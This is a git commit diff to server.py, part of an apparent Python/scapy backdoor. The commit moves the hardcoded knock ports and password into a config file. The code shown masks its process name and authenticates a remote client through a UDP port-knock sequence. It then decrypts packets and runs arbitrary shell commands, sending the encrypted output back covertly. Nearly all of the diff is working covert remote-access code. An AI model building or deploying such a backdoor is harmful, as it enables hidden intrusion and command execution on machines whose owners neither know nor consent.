5c45d78383d477e44f4ff33b114cf6eb232dadfd
Callum Styan <callumstyan@gmail.com>
2015-11-19 16:38:44 -0800

    always use cofigfile, remove the globals

--- server.py
+++ server.py
@@ -6,18 +6,6 @@ from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
 
 state = 0
-ports = [1000, 2000, 3000]
-password = 'abcdefyoyo'
-# unauthClients = {}
-# authedClients = {}
-
-# def encrypt(data):
-#     cipherText = triplesec.encrypt(b"string", b'* password *')
-#     return cipherText
-
-# def decrypt(data):
-#     plainText = triplesec.decrypt(data, b'* password *').decode()
-#     return plainText
 
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
@@ -37,18 +25,17 @@ def maskProcess():
 
 def knock(packet):
     global state
-    global ports
-    global unauthClients
+    knocks = configfile.knocks
     if IP in packet:
         if UDP in packet:
             ip = packet[IP].src
-            if packet[UDP].sport == 1000 and state == 0:
+            if packet[UDP].sport == knocks[0]  and state == 0:
                 state = 1
                 print packet[IP].src + " state 1"
-            elif packet[UDP].sport == 2000 and state == 1:
+            elif packet[UDP].sport == knocks[1] and state == 1:
                 state = 2
                 print packet[IP].src + " state 2"
-            elif packet[UDP].sport == 3000 and state == 2:
+            elif packet[UDP].sport == knocks[2] and state == 2:
                 state = 3
                 print packet[IP].src + " state 3"
             else:
@@ -57,7 +44,7 @@ def knock(packet):
 def shellCommand(packet, command):
     print "Running command " + command
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = password + output.stdout.read() + output.stderr.read()
+    output = configfile.password + output.stdout.read() + output.stderr.read()
     encryptedData = encryption.encrypt(output, configfile.password)
     packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=encryptedData)
     send(packet)
@@ -79,8 +66,8 @@ def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         encryptedData = packet['Raw'].load
         data = encryption.decrypt(encryptedData, configfile.password)
-        if data.startswith(password):
-            data = data[len(password):]
+        if data.startswith(configfile.password):
+            data = data[len(configfile.password):]
             commandType, commandString = data.split(' ', 1)
             if commandType == 'shell':
                 shellCommand(packet, commandString)
